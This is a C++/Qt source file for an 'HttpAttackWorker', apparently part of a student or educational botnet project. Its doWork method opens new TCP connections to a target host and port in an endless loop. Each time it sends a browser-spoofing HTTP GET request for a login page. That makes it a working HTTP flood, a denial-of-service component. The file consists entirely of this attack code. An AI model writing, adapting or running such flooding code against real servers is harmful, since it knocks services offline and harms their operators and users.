#include <QByteArray>
#include <QHostAddress>

#include "httpattackworker.h"

namespace workers
{
    void HttpAttackWorker::doWork(QString host, int port)
    {
        socket_ = std::make_unique<QTcpSocket>();
        QTcpSocket s;
        QObject::connect(socket_.get(), SIGNAL(readyRead()), this, SLOT(read()));
        //QObject::connect(socket_.get(), SIGNAL(error(QAbstractSocket::SocketError)), this, SLOT(error()));
        QString httpHeader("GET http://educational-botnet.herokuapp.com/login HTTP/1.1\r\nHost:educational-botnet.herokuapp.com\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: en-US,en;q=0.8,fr;q=0.6\r\n\r\n");
        //QString httpHeader("lol");
        while(true)
        {
            socket_ = std::make_unique<QTcpSocket>();
            socket_->connectToHost(host, port);
            if(socket_->waitForConnected())
            {

                if(socket_->state() == QAbstractSocket::ConnectedState)
                {
                    QByteArray arr = httpHeader.toUtf8();
                    int r = socket_->write(arr);
                    socket_->waitForBytesWritten();

                    /*if(socket_->waitForReadyRead(30))
                    {
                        QByteArray r = socket_->readAll();
                    }*/
                }
            }
        }
    }

    void HttpAttackWorker::read()
    {
        QByteArray data = socket_->readAll();
    }

    void HttpAttackWorker::error()
    {
        QString lol("");
    }
}
